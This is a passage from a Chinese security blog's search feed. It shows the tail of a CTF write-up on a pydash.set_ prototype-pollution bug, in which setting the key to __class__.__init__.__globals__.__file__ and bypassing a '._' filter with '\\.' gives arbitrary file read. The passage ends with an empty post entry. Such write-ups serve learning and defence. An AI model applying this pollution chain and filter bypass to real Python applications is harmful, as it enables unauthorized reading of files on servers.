class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pydash.set_(pollute, key, value)</span><br></pre></td></tr></table></figure><p>存在原型链污染的风险。这里直接对key传入__class__.__init__.__globals__.__file__就可以操控代码中的file变量实现任意文件读取。</p><p>但是在源代码中过滤了._，这里需要做一下绕过。跟进一下相应版本的pydash源码，会发现可以通过\\.来当作.使用，这样就可以做到任意文件读取。</p><p>至此的难度都还在笔者的预料之内，但是由于不知道flag文件名称，还要通过挖掘pydash源码中的链子来进行列目录。这里直接放一个gxn师傅的博客，就不再详细写了，太难了qaq</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>国护面试经验分享</title>
      <link href="/2024/07/02/%E5%9B%BD%E6%8A%A4%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"/>
      <url>/2024/07/02/%E5%9B%BD%E6%8A%A4%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
